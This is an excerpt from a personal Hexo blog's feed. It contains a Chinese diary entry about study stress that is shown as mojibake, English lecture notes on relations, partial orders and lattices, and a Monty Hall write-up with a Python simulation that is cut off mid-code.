        <content type="html"><![CDATA[<p>æœ€è¿‘å°±æ˜¯ä¸ªç„¦è™‘ï¼Œè‡ªæˆ‘puaçš„é«˜å‹çŠ¶æ€ï¼Œå‘ç°è¿™ç§çŠ¶æ€ä¸å¯é•¿æ—¶é—´ç»´æŒï¼Œé‚æ‘†ä¸¤å¤©æ­‡æ­‡ï¼Œå·²ç¼“ç²¾ç¥ç´§å¼ é—®é¢˜ã€‚</p><p>10æœˆ2å·åˆ°7å·ï¼Œä¸€ç›´åœ¨ç„¦è™‘çš„å†™ä½œä¸šï¼Œå…¶ä¸­æ•°å­¦å­¦åˆ°äº†æ¦‚å¿µç¹å¤šçš„relationï¼Œæˆ‘å†™äº†ä¸¤ç¯‡ç¬”è®°ï¼ŒèŠ±äº†ä¸‰å¤©æ—¶é—´æ‰æŠŠlecturor Paulè®²çš„ä¸œè¥¿ï¼ˆä¸‰ä¸ªvideo recordingsï¼‰å†™æˆåœ¨çº¿çš„æ•°å­¦ç¬”è®°ï¼Œæ¶ˆåŒ–å…¶ä¸­çš„å„ç§çŸ¥è¯†ç‚¹èŠ±è´¹äº†å¾ˆé•¿æ—¶é—´ã€‚æœŸé—´æ™šä¸Šæ²¡æœ‰0ç‚¹ä¹‹å‰ç¡è¿‡ï¼Œå½“æ—¶è‡ªæˆ‘PUAï¼Œå­¦ä¹ texè¯­æ³•è°ƒè¯•blogå„ç§å‚æ•°ï¼Œå„ç§å‹åŠ›ä¸‹ï¼Œç²¾ç¥å¤ªç´§ç»·ã€‚æ€»ç®—å¥½çš„æ˜¯ï¼Œ7å·æŠŠå„ç§quizå†™å®Œäº†ã€‚å¥½çš„æ˜¯ï¼Œé‚£ä¸ªquizå‡ ä¹å…¨å¯¹ï¼›åçš„æ˜¯ï¼Œæˆ‘é”™äº†ä¸€ä¸ªå°é€‰é¡¹ä¸¢äº†ä¸€åˆ†ï¼Œå› ä¸ºå½“æ—¶å¯¹â€œ0æ˜¯å¦æ˜¯è‡ªç„¶æ•°â€ï¼Œæˆ‘ä¸Šç½‘æœï¼Œå‘ç°ç½‘ä¸Šè¯´1æ‰æ˜¯æœ€å°çš„è‡ªç„¶æ•°ï¼Œä½†æ˜¯Ed Forumä¸Šè¯´â€œ0æ˜¯æœ€å°çš„è‡ªç„¶æ•°â€ï¼Œåœ¨Jiaojiaoç»™çš„PPTä¸Šå°±æœ‰ã€‚</p><p>ä½†æ˜¯ç¡èµ·æ¥ï¼Œ7å·æ¥ç€ï¼Œä¸å°å¿ƒä¸€ä¸ªå¤±è¯¯æ“ä½œï¼ŒæŠŠblogå…¨åˆ äº†ã€‚ã€‚</p><p><img src="/2024/10/10/trivia/%E8%87%AA%E6%88%91%E6%89%B9%E8%AF%84/2024-10-10-18-16-14.png" alt></p><p><img src="/2024/10/10/trivia/%E8%87%AA%E6%88%91%E6%89%B9%E8%AF%84/2024-10-10-18-16-32.png" alt></p><p>å½“æ—¶å¿ƒæƒ…å¤æ‚ï¼Œæåº¦å¤æ‚ï¼Œç´¢æ€§å¼€æ‘†ï¼Œå»å­¦æ ¡è½¬äº†è½¬ï¼Œç¼“è§£ä¸‹å¿ƒæƒ…ã€‚ä¸€æ•´å¤©æ²¡å†ç†blogã€‚</p><p>åæ¥ï¼Œå‘ç°è‡ªå·±ç”¨Vmwareå‡ ä¸ªæœˆå‰æ‰“äº†ä¸€ä¸ªå¿«ç…§ï¼Œä¸¤ä¸ªæœˆå‰çš„blogè¿˜åœ¨ï¼ŒèŠ±äº†ä¸¤å¤©æŠŠblogç³»ç»Ÿæ¢å¤åï¼Œå®åœ¨æ˜¯ä¾ç„¶éš¾å—å’Œç„¦è™‘ã€‚é‚£ä¸ªå¾ˆå¤æ‚çš„relation2çš„æ•°å­¦ç¬”è®°è¿˜å¾—é‡æ–°å†™ä¸€ä¸‹ï¼Œè¡¥äº†è‡ªå·±è¿‡å»çš„blogï¼Œcopyè‡ªå·±ï¼Œç®—æ˜¯æŠŠblogæŠ¢æ•‘å›æ¥äº†ã€‚æ€ªè‡ªå·±æ²¡æœ‰æå‰å‘ç°hexoçš„éƒ¨ç½²ç¼ºé™·ï¼Œå°±åº”è¯¥è‡ªå·±å¤šä¸ªå¿ƒçœ¼ï¼Œå¯¹blogè¿™ç§åŸåˆ›æ€§å¼ºçš„ä¸œè¥¿ä¸Šä¼ åˆ°githubä¸Šè¿›è¡Œå¤‡ä»½ã€‚</p><p>ä¸‹åˆå†™ç®—æ³•quizï¼Œä¸€ä¸å°å¿ƒé”™ä¸¤ä¸ªé¢˜ï¼Œæˆ‘äº‹åè¯¸è‘›äº®è·³èµ·æ¥éª‚è‡ªå·±ã€‚æ— ç¼˜æ— æ•…ä¸¢ä¸¤åˆ†ï¼Œæ€ªè‡ªå·±æ²¡æå‰å‡†å¤‡ï¼Œæ€ªè‡ªå·±åšçš„æ—¶å€™æ€ä¹ˆé‚£ä¹ˆå¤šæ—¶é—´ä¹Ÿæ²¡æœ‰ååº”è¿‡æ¥é¢˜ç›®çš„æ­£ç¡®ç­”æ¡ˆï¼Ÿæ¨ç†éƒ½æ¨äº†é‚£ä¹ˆé•¿æ—¶é—´äº†ï¼Œå´æ€»æ˜¯ä¸€ç‚¹ç‚¹å°å¤±è¯¯ç»™è‡ªå·±æ•´ç ´é˜²ã€‚</p><p>8å·æ™šä¸Šï¼Œä¸€å£æ°”ä¸‰ä¸ªå°æ—¶æŠŠpythonçš„trinumberç»™å†™å®Œäº†ï¼Œåå¤è°ƒè¯•äº†ä¸‹ï¼Œå­¦åˆ°profileåŠŸèƒ½ã€æ•°å­¦åˆ†è§£åŠŸèƒ½ï¼Œç»ˆäºä»¥ç¬é—´è¿è¡Œçš„ç®—æ³•æŠŠä½œä¸šå†™å®Œäº†ï¼š</p><p>å†™ç¨‹åºåšå¤§æ•°åˆ†è§£ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæˆ‘ç”¨listï¼Œå¸ƒå°”è¿‡æ»¤å™¨ä¸€ç±»çš„ä¸œè¥¿å¤§åŠ›å‡ºå¥‡è¿¹ï¼Œåæ¥å‘ç°æ—¶é—´å¤æ‚åº¦ä½¿è®¡ç®—æåº¦å¤æ‚ï¼Œå†…å­˜ä¹Ÿå¾ˆå·®ï¼Œåœ¨ä¸€äº›æ€§èƒ½å·®ç‚¹çš„æœºå™¨éƒ½è·‘ä¸é€šã€‚ç”¨ideçš„profileæ£€æŸ¥äº†ä¸‹å„æ¨¡å—è¿è¡Œæ—¶é—´ï¼Œå¯¹ç…§äº†ä¸€äº›æˆ‘æ²¡éªŒè¯çš„æƒ³æ³•ï¼Œæƒ³äº†æƒ³è¿˜æ˜¯ç®—æ³•æœ¬èº«é—®é¢˜ã€‚</p><p>â€‹å¯¹è„‘è¢‹é‡Œä¸€å¼€å§‹æ²¡æƒ³æ¸…æ¥šçš„ç»†èŠ‚è¿›è¡Œäº†æ•°å­¦éªŒè¯å’Œç®€åŒ–åï¼Œæ€è·¯å˜å¾—æåº¦æ¸…æ™°ï¼Œæ”¹äº†æ”¹ä»£ç ï¼Œä»4åˆ†é’Ÿè·‘ä¸€ä¸ªæ•°å˜æˆäº†ç§’å‡ºå¤§æ•°ç»“æœã€‚</p><p>ç®—æ˜¯è‹¦ä¸­ä½œä¹ï¼Œæ€»å¾—æƒ³åŠæ³•æŠŠè‡ªå·±çš„ç”Ÿç‰©é’Ÿã€ç´§ç»·çš„ç²¾ç¥çŠ¶æ€è°ƒæ•´è¿‡æ¥ï¼Œæ‰èƒ½è¿æ¥ä¸‹å‘¨çš„æœŸä¸­è€ƒè¯•ã€‚</p><p>è‡ªå·±å†æƒ³æƒ³ï¼Œåº”è¯¥å¤šè°¨æ…å¤šæ¨æ•²ï¼Œä¸‹æ¬¡é¿å…å¥‡å¥‡æ€ªæ€ªçš„å„ç§é”™è¯¯ã€‚</p><p>å¥½äº†ï¼Œè‡ªå·±ç»™è‡ªå·±è§„å®š9ç‚¹ä¹‹åä¸å†ä½¿ç”¨å„ç§ç”µå­è®¾å¤‡ï¼Œé¿å…è“å…‰åˆºæ¿€ç²¾ç¥å¯¼è‡´å½±å“ç¡çœ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>relation(2)</title>
      <link href="/2024/10/06/Math/relation-2/"/>
      <url>/2024/10/06/Math/relation-2/</url>
      
        <content type="html"><![CDATA[<p>Last week Paul took 3 lectures to teach the relations. The concepts are a little many for newers, and I spent 4 days to understand what he taught.</p><p><img src="/2024/10/06/Math/relation-2/math-relation-lecture6.png" alt></p><ul><li><a href="#equivalence-relations-rst">Equivalence Relations (R)(S)(T)</a><ul><li><a href="#definition-of-equivalence-relation">definition of Equivalence Relation</a></li></ul></li><li><a href="#equivalence-classes">Equivalence Classes</a></li><li><a href="#partitions">Partitions</a><ul><li><a href="#examples">examples</a></li></ul></li><li><a href="#partial-orders-rast">Partial Orders (R),(AS),(T)</a><ul><li><a href="#examples-1">examples</a></li></ul></li><li><a href="#hasse-diagram">Hasse diagram</a></li><li><a href="#ordering">Ordering</a><ul><li><a href="#minimal-maximal-minimum-maximum">Minimal, Maximal, Minimum, Maximum</a></li><li><a href="#examples-2">Examples</a></li><li><a href="#upper-bound--lower-bound-lub-glb">upper bound,  lower bound, lub, glb</a></li><li><a href="#lub-glb">lub, glb</a><ul><li><a href="#example">Example</a></li></ul></li><li><a href="#lattice-and-complete-lattice">lattice and complete lattice</a><ul><li><a href="#example-1">example</a></li></ul></li></ul></li><li><a href="#total-orders">Total orders</a><ul><li><a href="#example-2">example</a></li></ul></li><li><a href="#ordering-of-a-poset">Ordering of a Poset</a><ul><li><a href="#topological-sort">Topological Sort</a></li><li><a href="#well-ordered-sets">Well-Ordered Sets</a><ul><li><a href="#examples-3">Examples</a></li></ul></li><li><a href="#cartesian-products">Cartesian products</a></li><li><a href="#lexicographic-order">Lexicographic order</a></li><li><a href="#lenlex-order">Lenlex order</a></li><li><a href="#example-for-above">example for above</a></li></ul></li></ul><h1 id="Equivalence-Relations-R-S-T"><a href="#Equivalence-Relations-R-S-T" class="headerlink" title="Equivalence Relations (R)(S)(T)"></a>Equivalence Relations (R)(S)(T)</h1><p>Equivalence relations capture a general notion of â€œequalityâ€. They are relations which are:</p><p><strong>Reflexive (R)</strong>: Every object should be â€œequalâ€ to itself</p><p><strong>Symmetric (S)</strong>: If x is â€œequalâ€ to y, then y should be â€œequalâ€ to x</p><p><strong>Transitive (T)</strong>: If x is â€œequalâ€ to y and y is â€œequalâ€ to z, then x should be â€œequalâ€ to z.</p><h2 id="definition-of-Equivalence-Relation"><a href="#definition-of-Equivalence-Relation" class="headerlink" title="definition of Equivalence Relation"></a>definition of Equivalence Relation</h2><p><strong>A binary relation R âŠ† S Ã—S</strong> is <strong>equivalence relation</strong> if it satisfies (R), (S), (T).</p><h1 id="Equivalence-Classes"><a href="#Equivalence-Classes" class="headerlink" title="Equivalence Classes"></a>Equivalence Classes</h1><p>Suppose R âŠ† S Ã—S is an equivalence relation</p><p>The <strong>equivalence class</strong> [s] (w.r.t. R) of an element s âˆˆ S is</p><script type="math/tex; mode=display">[s] = \{ t: t \in S \quad and \quad sRt \}</script><p><strong>Fact</strong></p><p>s R t if and only if [s] = [t].</p><h1 id="Partitions"><a href="#Partitions" class="headerlink" title="Partitions"></a>Partitions</h1><p>A partition of a set S is a collection of sets $S_1, \dots, S_k$ such that</p><script type="math/tex; mode=display">S_i \quad and \quad S_j \text{ are disjoint for i } \neq \text{ j}\\S = S_1 \cup S_2 \cup \dots \cup S_k = \cup^{k}_{i=1} S_i</script><p>The collection of all equivalence classes {[s] : s âˆˆ S} forms a partition of S.</p><p>In the opposite direction, a partition of a set defines the equivalence relation on that set. If $S = S_1 \cup S_2 \cup \dots \cup S_k$, then we can define $\sim \subseteq S \times S$ as </p><script type="math/tex; mode=display">s \sim t \text{ exactly when s and t belong to the same } S_i.</script><h2 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h2><p>Q: Show that $m âˆ¼ n$ iff $m^2 \underset{(5)}{=} n^2$ is an equivalence on </p><script type="math/tex; mode=display">S = \{1, \dots, 7\}</script><p>A:<br>It just means that $m \underset{(5)}{=} n$ or $m \underset{(5)}{=} -n$ </p><p>e.g. $1 \underset{(5)}{=} -4$ </p><p>This satisfies (R), (S), (T).</p><p>Find all the equivalence classes.</p><p>We have<br>[1] = {1,4,6},<br>[2] = {2,3,7},<br>[5] = {5}</p><h1 id="Partial-Orders-R-AS-T"><a href="#Partial-Orders-R-AS-T" class="headerlink" title="Partial Orders (R),(AS),(T)"></a>Partial Orders (R),(AS),(T)</h1><p>A <strong>partial order</strong> $\preceq$ on S satisfies (R),(AS),(T)</p><p>We call $(S, \preceq)$ a poset â€” partially ordered set</p><h2 id="examples-1"><a href="#examples-1" class="headerlink" title="examples"></a>examples</h2><p>Posets:</p><script type="math/tex; mode=display">(\mathbb{Z}, \preceq)\\(Pow(X), \subseteq) \text{ for some set X}\\(\mathbb{N},|)</script><p>Not posets:</p><script type="math/tex; mode=display">(\mathbb{Z}, <)\\(\mathbb{Z}, |)</script><h1 id="Hasse-diagram"><a href="#Hasse-diagram" class="headerlink" title="Hasse diagram"></a>Hasse diagram</h1><p>Every finite poset (S,âª¯) can be represented with a <strong>Hasse diagram</strong>:</p><p>Nodes are elements of S</p><p>An edge is drawn upward from x to y if x â‰º y and there is no z such that x â‰º z â‰º y</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-18-49-47.png" alt></p><h1 id="Ordering"><a href="#Ordering" class="headerlink" title="Ordering"></a>Ordering</h1><h2 id="Minimal-Maximal-Minimum-Maximum"><a href="#Minimal-Maximal-Minimum-Maximum" class="headerlink" title="Minimal, Maximal, Minimum, Maximum"></a>Minimal, Maximal, Minimum, Maximum</h2><p>Let (S,âª¯) be a poset.</p><p><strong>Minimal</strong> element: x such that there is no y= x with y âª¯ x</p><p><strong>Maximal</strong> element: x such that there is no y= x with x âª¯ y</p><p><strong>Minimum (least)</strong> element: x such that x âª¯ y for all y âˆˆ S</p><p><strong>Maximum (greatest)</strong> element: x such that y âª¯ x for all y âˆˆS</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-07-49.png" alt></p><p>Take Notice</p><p>There may be multiple minimal/maximal elements.</p><p>Minimum/maximum elements are the unique minimal/maximal elements if they exist.</p><p>Minimal/maximal elements always exist in finite posets, but not necessarily in infinite posets.</p><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p>Pow({a,b,c}) with the order âŠ†, <code>âˆ…</code> is minimum; <code>&#123;a,b,c&#125;</code> is maximum</p><p><code>Pow(&#123;a,b,c&#125;) \ &#123;&#123;a,b,c&#125;&#125;</code> (proper subsets of {a,b,c}). Each two-element subset <code>&#123;a,b&#125;,&#123;a,c&#125;,&#123;b,c&#125;</code> is <code>maximal</code>. But there is no maximum</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-08-19.png" alt></p><h2 id="upper-bound-lower-bound-lub-glb"><a href="#upper-bound-lower-bound-lub-glb" class="headerlink" title="upper bound,  lower bound, lub, glb"></a>upper bound,  lower bound, lub, glb</h2><p>Let (S,âª¯) be a poset.</p><p>x is an <strong>upper bound</strong> for A if a âª¯ x for all a âˆˆ A</p><p>x is a <strong>lower bound</strong> for A if x âª¯ a for all a âˆˆ A</p><p>The <strong>set of upper bounds</strong> for A is defined as ub(A) = {x : a âª¯ x for all a âˆˆ A}</p><p>The <strong>set of lower bounds</strong> for A is defined as lb(A) = {x : x âª¯ a for all a âˆˆ A}</p><p>The <strong>least upper bound</strong> of A, <strong>lub(A)</strong>, is the minimum of ub(A) (if it exists)</p><p>The <strong>greatest lower bound</strong> of A, <strong>glb(A)</strong> is the maximum of lb(A) (if it exists)</p><h2 id="lub-glb"><a href="#lub-glb" class="headerlink" title="lub, glb"></a>lub, glb</h2><p>To show x is glb(A) you need to show:</p><ul><li><p>x is a lower bound: x âª¯ a for all a âˆˆ A.</p></li><li><p>x is the greatest of all lower bounds: If y âª¯ a for all a âˆˆ A then y âª¯ x</p></li></ul><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>Pow(X) ordered by âŠ†.</p><ul><li><p>glb(A,B) = Aâˆ©B</p></li><li><p>lub(A,B) = AâˆªB</p></li></ul><h2 id="lattice-and-complete-lattice"><a href="#lattice-and-complete-lattice" class="headerlink" title="lattice and complete lattice"></a>lattice and complete lattice</h2><p>Let (S,âª¯) be a poset.</p><ul><li>(S,âª¯) is a <strong>lattice</strong> if lub(x,y) and glb(x,y) exist for every pair of elements x,y âˆˆ S.</li><li>(S,âª¯) is a <strong>complete lattice</strong> if lub(A) and glb(A) exist for every subset A âŠ† S.</li></ul><p>Take Notice</p><p>A finite lattice is always a complete lattice.</p><p>An infinite lattice need not have a lub (or no glb) for an arbitrary infinite subset of its elements, in particular no such bound may exist for <strong>all</strong> its elements.</p><p>For the pic below, for (b,c), {e,d,f} are the upper bounds, but there is no minimum of the ub. Hence lub doesnot exist, it is not a lattice.</p><p>it is not a lattice. for (e,d), b,c,a are the minimals, but they are not the minimum.</p><p><img src="/2024/10/06/Math/relation-2/lattice1.png" alt></p><p>is 30 the lub(5,15)? yes! is it a lattice? Yes, because it is finite.</p><p>who is the lb({10,30})? it is 10! And 10 is also glb({10,30})! Remember the poset can include themselves.</p><p><img src="/2024/10/06/Math/relation-2/lattice3.png" alt></p><p>not a lattice obviously.</p><p><img src="/2024/10/06/Math/relation-2/lattice4.png" alt></p><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>Q</p><p>{1,2,3,4,6,8,12,24} partially ordered by divisibility is a lattice</p><ul><li>e.g. lub({4,6}) = 12; glb({4,6}) = 2</li></ul><p>{1,2,3} partially ordered by divisibility is not a lattice</p><ul><li>{2,3} has no lub</li></ul><p>{2,3,6} partially ordered by divisibility</p><ul><li>{2,3} has no glb</li></ul><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-27-21.png" alt></p><p>{1,2,3,12,18,36} partially ordered by divisibility</p><ul><li>{2,3} has no lub (12,18 are minimal upper bounds)</li></ul><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-27-45.png" alt></p><hr><p>Q</p><p>(Z,â‰¤): neither lub(Z) nor glb(Z) exist</p><p>(F(N),âŠ†) [all finite subsets of N]: lub exists for pairs of elements but not generally for (infinite) sets of elements. glb exists for any set of elements: intersection of a set of finite sets is finite.</p><p>(I(N),âŠ†) [all infinite subsets of N]: glb does not exist for some pairs of elements (e.g. odds and evens). lub exists for any set of elements: union of a set of infinite sets is always infinite.</p><hr><p>Q: Considerposet(R,â‰¤)</p><p>(a) Is this a lattice?</p><p>(b) Give an example of a non-empty subset of R that has no upper bound.</p><p>(c) Find lub({ x âˆˆ R:x &lt; 73 })</p><p>(d) Find lub({ x âˆˆ R:x â‰¤ 73 })</p><p>(e) Find lub( x :$x^2$ &lt; 73 )</p><p>(f) Find glb( x :$x^2$ &lt; 73 )</p><p>A:</p><p>Yes</p><p>{ r âˆˆR:r &gt;0}</p><p>=(0,âˆ)</p><p>73</p><p>73</p><p>âˆš73</p><p>âˆ’âˆš73</p><h1 id="Total-orders"><a href="#Total-orders" class="headerlink" title="Total orders"></a>Total orders</h1><p>A <strong>total order</strong> is a <strong>partial order</strong> that also satisfies:</p><p><strong>(L) Linearity</strong> (any two elements are comparable):</p><p>For all x,y either: x â‰¤ y or y â‰¤ x (or both if x = y)</p><p>Take Notice</p><p>On a finite set all total orders are â€œisomorphicâ€</p><p>On an infinite set there is quite a variety of possibilities.</p><h2 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h2><p>Z with â‰¤:</p><p>(no minimum/maximum element)</p><p>Z with {(x,y) : (xy â‰¤ 0 and x â‰¤ y) or (xy &gt; 0 and |x| â‰¤ |y|)}:</p><p>(no maximum element, minimum element is-1)</p><p>Z with {(x,y) : (xy â‰¤ 0 and x â‰¥ y) or (xy &gt; 0 and x â‰¤ y)}:</p><p>(minimum element 1, maximum element-1)</p><h1 id="Ordering-of-a-Poset"><a href="#Ordering-of-a-Poset" class="headerlink" title="Ordering of a Poset"></a>Ordering of a Poset</h1><h2 id="Topological-Sort"><a href="#Topological-Sort" class="headerlink" title="Topological Sort"></a>Topological Sort</h2><p>For a poset (S,âª¯) any total order â‰¤ that is consistent with âª¯ (if a âª¯b then a â‰¤b) is called a <strong>topological sort</strong>.</p><p>Consider</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-39-20.png" alt></p><p>The following all are topological sorts:</p><pre><code>a â‰¤ b â‰¤ e â‰¤ c â‰¤ f â‰¤da â‰¤ e â‰¤ b â‰¤ f â‰¤ c â‰¤da â‰¤ e â‰¤ f â‰¤ b â‰¤ c â‰¤d</code></pre><p>all of these orders are right</p><h2 id="Well-Ordered-Sets"><a href="#Well-Ordered-Sets" class="headerlink" title="Well-Ordered Sets"></a>Well-Ordered Sets</h2><p>A <strong>well-ordered set</strong> is a poset where every subset has a least element</p><p>Take Notice</p><p>The greatest element is not required.</p><p>Well-ordered sets are an important mathematical tool to prove termination of programs.</p><h3 id="Examples-1"><a href="#Examples-1" class="headerlink" title="Examples"></a>Examples</h3><script type="math/tex; mode=display">\mathbb{N} = \{ 0, 1, \dots \}</script><p> Disjoint union of copies of $\mathbb{N}$:</p><script type="math/tex; mode=display">\mathbb{N}_1 \cup \mathbb{N}_2 \cup \mathbb{N}_3 \cup \dots</script><p>where each Ni â‰ƒ N and N1 &lt; N2 &lt; N3Â·Â·Â·</p><h2 id="Cartesian-products"><a href="#Cartesian-products" class="headerlink" title="Cartesian products"></a>Cartesian products</h2><p>Product order: Given posets $(S,âª¯_S)$ and $(T,âª¯_T)$, define:</p><p>(s, t) âª¯ (sâ€™,tâ€™) if s $âª¯_S$ sâ€² and t $âª¯_T$ tâ€™</p><p>Notes</p><p>No implicit weighting.</p><p>No bias toward any component.</p><p>In general, it is only a partial order, even if combining total orders.</p><p>Which cannot compare contray s and t:</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-50-52.png" alt></p><h2 id="Lexicographic-order"><a href="#Lexicographic-order" class="headerlink" title="Lexicographic order"></a>Lexicographic order</h2><p>Given posets (S,$âª¯<em>S$) and (T,$âª¯_T$), define:<br>(s, t) $â‰¤</em>{lex}$ (sâ€²,tâ€²) if s $âª¯_S$ sâ€² or (s = sâ€² and t $âª¯_T$ tâ€²)</p><p>Extension to words: $Î» â‰¤_{lex} w$ for all words</p><p>Notes</p><p>No implicit weighting.</p><p>Gives total order when combining total orders.</p><p>Can be sensibly extended to words.</p><p><strong>Not ideal for enumeration.</strong></p><h2 id="Lenlex-order"><a href="#Lenlex-order" class="headerlink" title="Lenlex order"></a>Lenlex order</h2><p>Lexicographic ordering, but order by length first.</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-56-31.png" alt></p><p>Notes</p><p>Only applicable for languages (subsets of $Î£^âˆ—$).</p><p>Gives total order when Î£ is totally ordered.</p><p>Gives an enumeration of $Î£^âˆ—$.</p><h2 id="example-for-above"><a href="#example-for-above" class="headerlink" title="example for above"></a>example for above</h2><p>Q</p><p>Let $\mathbb{B}$={0,1} with the usual order 0&lt;1. List the elements 101,010,11,000,10,0010,1000 of $\mathbb{B}^*$ in the</p><p>(a) Lexicographic order</p><p>000,0010,010,10,1000,101,11</p><p>(b) Lenlex order</p><p>10,11,000,010,101,0010,1000</p><hr><p>Q:</p><p>Whenarethelexicographic order and lenlex on $Î£^âˆ—$ the same?</p><p>Only when $|Î£| = 1$.</p><hr><p>Q: Trueor false?</p><p>(a) If a set Î£ is totally ordered, then the corresponding lexico graphic partial order on $Î£^âˆ—$ also must be totally ordered.</p><p>True</p><p>(b) If a set Î£ is totally ordered, then the corresponding lenlex order on $Î£^âˆ—$ also must be totally ordered.</p><p>True</p><p>(c) Every finite poset has a Hasse diagram.</p><p>True</p><p>(d) Every finite poset has a topological sorting.</p><p>True</p><p>(e) Every finite poset has a minimum element.</p><p>False</p><p>(f) Every finite totally ordered set has a maximum element.</p><p>True</p><p>(g) An infinite poset cannot have a maximum element.</p><p>False</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MontyHall(UNSW)</title>
      <link href="/2024/10/04/Algorithm/MontyHall/"/>
      <url>/2024/10/04/Algorithm/MontyHall/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#introduction">introduction</a></li><li><a href="#problem">problem</a></li><li><a href="#analysis">analysis</a></li><li><a href="#simulation">simulation</a></li></ul><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>I first meet Monty Hall problem in a korean drama that is called D.P.: A soldier escaped from the military, and applied the essence of Monty Hall problem to make life better, although I think it was not rigorous.</p><p>Monty Hall problem is not complicated, it is an only high school levelâ€™s statistic problem. But it is a little counter-intuitive.</p><p><a href="https://en.wikipedia.org/wiki/Monty_Hall_problem">Monty Hall on wikipedia</a></p><p>The description of Monty Hall problem is cited from UNSW COMP9021, there is a nuance between the wikipediaâ€™s description and the context below about <strong>2 goats</strong> OR <strong>1 goat and one empty room</strong>. I would prefer to use <code>2 goats</code> later, and please regard the two conditions as an equivalence. Just regard choosing the car as a success.</p><h1 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h1><p>A contestant and a host are at a place that gives access to three rooms, whose doors are all closed before the game starts. A car is in one room, a goat in another, while the third room is empty. The host knows what is in each room, while the contestant doesnâ€™t. The contestant is asked to chose one of the doors. Following that choice, the host opens another door, which is that of a room that does not contain the car. The contestant is then asked to either stick to his choice or â€œswitchâ€, that is, choose the third door (e.g., the door which is neither the one he chose in the first place nor the one that the host opened). The host opens the door as requested by the contestant, who wins what is in the room, if anything. The question is: what is the contestantâ€™s best strategy â€“ to switch or not to switch?</p><h1 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h1><p>The contestant wishes to win the car, not the goat. He has one chance out of three to, in the first place, choose the door of the room that contains the car.</p><ul><li>If he does not switch, he then has one chance out of three to win.</li><li>If he switches then he loses in case the room he chose in the first place contains the car. But he wins otherwise. Indeed, out of both doors that are still closed, one contains the car, so the host has to open the other one (that is, if the room whose door was chosen in the first place contains nothing, then the host opens the door of the room that contains the goat, and if the room whose door was chosen in the first place contains the goat, then the host opens the door of the room that contains nothing). So in both cases, the second door that the host opens following the decision of the contestant to switch is that of the room that contains the car.</li></ul><p>Hence by switching, the contestant has two chances out of three to win. Hence it is best to switch.</p><p>The car is put average Randomly behind the rooms, so we can use chart to list all the situations.</p><div class="table-container"><table><thead><tr><th>Behind door 1</th><th>Behind door 2</th><th>Behind door 3</th><th>Result if staying at door</th><th>Result if switching to the door offered</th></tr></thead><tbody><tr><td>Goat</td><td>Goat</td><td><strong>Car</strong></td><td>Wins goat</td><td><strong>Wins car</strong></td></tr><tr><td>Goat</td><td><strong>Car</strong></td><td>Goat</td><td>Wins goat</td><td><strong>Wins car</strong></td></tr><tr><td><strong>Car</strong></td><td>Goat</td><td>Goat</td><td><strong>Wins car</strong></td><td>Wins goat</td></tr></tbody></table></div><p>For the contestant, at the beginning before the host opened a room without car, he has 1/3 chance to win the car; but later the host intendly chooses the room without car, notebly it is not random. And contestant now has 1/2 chance to win the car of these two room left.</p><p>But it is an entire game, we need to calculate the opportunity from the very first beginning. Our intuition of 1/3 and 1/2 is not wrong, but it is counter-intuitive to compute the cumulative chance. The contestant doesnot do temporary decision, which is only 1/3 and 1/2 at those stages. He wants to do the best strategy of the whole game. The interference factor is the hostâ€™s choosing intendly.</p><p>Iâ€™d better to recommand the probability calculation below or simulation to figure it out.</p><h1 id="simulation"><a href="#simulation" class="headerlink" title="simulation"></a>simulation</h1><p>We aim to simulate the playing of this game, with either strategy, switching or not, to check that when it is played with the chosen strategy a large enough number of times, then the experimental results support the conclusions of the previous reasoning. More precisely, the user should be asked and express whether he wants to switch and how many times the game should be played. By default, if the user requests to play at most 6 games, then the details of each game (which door the contestant choses in the first place, which door the host opens first, and which door he opens next that determines the outcome of the game), will be output; if the user requests more games to be played, then the details of the first 6 games only will be output. It should be possible to set the default of 6 to another value. In any case, the percentage of times the contestant won the game should be eventually displayed.</p><p><strong>Notebly: Donâ€™t use seed</strong> in a totally random scene. Random function only is enough to simulate a totally random number, and seed is only to avoid the predicted of the random function, because it depends on systemâ€™s date or something. But the dependency is a really random number.</p><pre><code class="lang-python"># Written by Eric Martin for COMP9021&#39;&#39;&#39;Simulates the Monty Hall problem.- A car is hidden behind 3 doors.- The contestant randomly choses a door.- The game host opens a door behind which there is no car.- The contestant then has the option to change her mind and open another  door.Prompts the user for the number of times the game is played, and whetherthe contestant opts for switching door or not.Displays the details of the game for the few first games, set to amaximum of 6 by default, and prints out the proportion of games beingwon.&#39;&#39;&#39;from random import choice, randrangedef set_simulation():    while True:        try:            nb_of_games = int(input(&#39;How many games should I simulate? &#39;))            if nb_of_games &lt;= 0:                raise ValueError            break        except ValueError:            print(&#39;Your input is incorrect, try again.&#39;)    while True:        contestant_switches = input(&#39;Should the contestant switch? &#39;)        if contestant_switches.istitle():            contestant_switches = contestant_switches.lower()        if contestant_switches in &#123;&#39;yes&#39;, &#39;y&#39;&#125;:            contestant_switches = True            print(&#39;I keep in mind you want to switch.&#39;)            break        if contestant_switches in &#123;&#39;no&#39;, &#39;n&#39;&#125;:            contestant_switches = False            print(&quot;I keep in mind you don&#39;t want to switch.&quot;)            break        print(&#39;Your input is incorrect, try again.&#39;)    return nb_of_games, contestant_switchesdef simulate(nb_of_games_to_display=6):    nb_of_games, contestant_switches = set_simulation()    print(&#39;Starting the simulation with the 